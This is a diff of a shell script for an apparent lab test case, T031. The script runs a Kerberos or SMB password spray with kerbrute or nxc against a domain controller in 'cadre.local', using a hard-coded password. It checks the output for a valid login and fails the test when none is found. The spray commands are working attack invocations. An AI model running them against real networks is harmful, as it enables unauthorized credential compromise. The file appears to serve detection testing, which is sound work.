@@ -17,21 +17,23 @@ analyst_dfir
 analyst_cloud
 eng_agentic
 EOF
+SPRAY_LOG="/tmp/${CASE_ID:-cadre-t031}.spray"
 if command -v kerbrute >/dev/null 2>&1; then
-  # Single known-pass spray (lab) — validates 4768/4771 path without long brute
-  kerbrute passwordspray -d cadre.local --dc 192.168.77.10 "${USERS}" 'C0mm@nd_Ch1ef!' || true
+  set +e
+  kerbrute passwordspray -d cadre.local --dc 192.168.77.10 "${USERS}" 'C0mm@nd_Ch1ef!' | tee "${SPRAY_LOG}"
+  set -e
   echo "T031_KERBRUTE_DONE"
+  grep -qi 'VALID LOGIN' "${SPRAY_LOG}" || { echo "T031_FAIL: kerbrute produced no valid login" >&2; exit 1; }
+  echo "T031_OK"
 elif command -v nxc >/dev/null 2>&1; then
-  nxc smb 192.168.77.10 -u "${USERS}" -p 'C0mm@nd_Ch1ef!' --continue-on-success || true
+  set +e
+  nxc smb 192.168.77.10 -u "${USERS}" -p 'C0mm@nd_Ch1ef!' --continue-on-success | tee "${SPRAY_LOG}"
+  set -e
   echo "T031_NXC_DONE"
+  grep -qi 'chief_command' "${SPRAY_LOG}" || { echo "T031_FAIL: nxc produced no successful auth" >&2; exit 1; }
+  echo "T031_OK"
 else
-  # Minimal AS-REQ style check via python Impacket if available
-  python3 - <<'PY' || true
-from pathlib import Path
-users = Path("/tmp/cadre-spray-users.txt").read_text().split()
-print("T031_USERS", users)
-print("T031_NO_SPRAY_TOOL — install kerbrute or nxc; wordlist present")
-PY
-  echo "T031_SURFACE_OK wordlist=$(wc -l < "${WORDLIST}")"
+  echo "T031_FAIL: install kerbrute or nxc on provisioning" >&2
+  exit 1
 fi
 echo "T031 complete"
